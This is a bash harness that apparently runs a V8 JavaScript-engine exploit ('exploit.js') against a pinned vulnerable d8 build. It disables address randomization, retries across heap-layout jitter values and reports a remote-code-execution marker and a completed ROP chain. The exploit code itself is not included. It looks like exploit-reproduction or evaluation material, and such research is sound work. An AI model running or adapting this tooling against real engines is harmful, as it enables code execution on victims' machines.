#!/usr/bin/env bash
set -u

script_dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
v8_dir="$script_dir/v8-vulnerable/v8"
d8_bin="$v8_dir/out/x64.release/d8"
expected_build_id="bd7f721b0b4e20fe"

if [[ ! -x "$d8_bin" ]]; then
  echo "[-] missing executable: $d8_bin" >&2
  exit 1
fi

if ! readelf -n "$d8_bin" 2>/dev/null | rg -q "$expected_build_id"; then
  echo "[-] d8 build-id mismatch; expected $expected_build_id" >&2
  exit 1
fi

if ! setarch x86_64 -R true 2>/dev/null; then
  echo "[-] setarch x86_64 -R is unavailable in this environment" >&2
  exit 1
fi

# Failed exploit attempts must not leave multi-gigabyte core files behind.
ulimit -c 0
cd "$v8_dir" || exit 1

for jitter in {0..32}; do
  output=$(setarch x86_64 -R "$d8_bin" \
    --liftoff-only --allow-natives-syntax --expose-gc \
    ../../exploit.js -- 0x7fff 54 x "$jitter" 2>&1)
  status=$?

  if [[ "$output" == *M152_D8_RCE_OK* ]]; then
    formatted_output=${output%M152_D8_RCE_OK}
    printf '%s' "$formatted_output"
    if [[ $status -ne 42 ]]; then
      echo "[-] marker appeared but exit status was $status, not 42" >&2
      exit 1
    fi
    printf '%s\n' \
      '[*] Stage 5 | Fixed ROP chain completed' \
      '[+] Full exploit chain completed successfully' \
      "    [+] target build ID            : $expected_build_id" \
      "    [+] successful heap jitter     : $jitter" \
      '    [+] process exit status        : 42'
    exit 0
  fi
done

echo "[-] exploit did not stabilize after 33 heap-layout attempts" >&2
exit 1
